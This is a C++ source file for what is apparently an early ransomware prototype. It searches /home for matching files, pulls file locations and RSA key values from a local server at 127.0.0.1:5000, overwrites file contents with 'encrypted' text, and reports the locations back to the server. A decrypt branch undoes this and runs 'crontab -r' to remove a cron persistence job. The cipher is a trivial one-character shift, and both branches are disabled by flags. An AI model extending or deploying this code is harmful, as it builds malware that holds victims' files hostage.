#include <string>
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include "headers/ransomFunctions.h"
#include "headers/json.hpp"


int main(){  

	system("find /home -type f -name catP* > fileLocations"); // Run bash command to find files in subdirectories of /home and put them into a file to be read.

	std::vector<std::string> fileLocationsVector;
	std::vector<std::string> locationsToBeEncrypted;  
	nlohmann::json j_complete = nlohmann::json::parse(get_request("http://127.0.0.1:5000/locations"));    
    int N = nlohmann::json::parse(get_request("http://127.0.0.1:5000/secretKey"))["N"]; // encryption modulo.
    int e = nlohmann::json::parse(get_request("http://127.0.0.1:5000/secretKey"))["rsa_e"]; // encryption power.
    int d =  nlohmann::json::parse(get_request("http://127.0.0.1:5000/secretKey"))["rsa_d"]; // decryption power.
    int secretKey = 1; 
    
	
	bool success = getFileContents("fileLocations", fileLocationsVector); // Reads found file locations into string vector.	
	std::vector<std::string> serverLocationsVector = jsonToStringVector(j_complete); // Puts server locations into a string vector.		
	locationsMinusServerLocations(locationsToBeEncrypted, fileLocationsVector, serverLocationsVector); // Removes locations already stored on server.  	
    
    bool encrypt = false; 
    bool decrypt = false;
	
	//ENCRYPT
    if(locationsToBeEncrypted.size() > 0 & encrypt){
    	std::vector<std::vector<std::string>> fileContentVector = fileContentRetreiver(locationsToBeEncrypted); // Puts contents of files into a vector<vector<string>>
	 	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
		for(auto& file: fileContentVector){
			for(auto& line : file){
				basicEncryptContent(line, secretKey);
			}			
		}
		for(int i = 0 ; i < locationsToBeEncrypted.size(); i++){
			post_request(locationsToBeEncrypted[i]);
		}				
		// UPDATE FILES - after the contents of the files have been encrypted. Replace contents of file with encrypted content.		
		encryptOrDecryptFile(fileContentVector, fileLocationsVector);	
    }


    //DECRYPT
    if(decrypt){
    	std::vector<std::vector<std::string>> fileContentVector2 = fileContentRetreiver(serverLocationsVector); // Puts contents of files into a vector<vector<string>>
	    // DECRYPT - Basic encryption. Just decrements by one. Will change for asymmetric decryption.
		for(auto& file: fileContentVector2){
			for(auto& line : file){
				basicDecryptContent(line, secretKey);
			}
		}
		for(int i = 0 ; i < serverLocationsVector.size(); i++){
			
			delete_request(std::to_string(i + 1));
		}
		// UPDATE FILES - after the contents of the files have been decrypted. Replace contents of file with encrypted content.	
		encryptOrDecryptFile(fileContentVector2, serverLocationsVector);
		system("crontab -r"); // Removes crontab job that periodically runs the script.			
    }
	
    return 0;
}
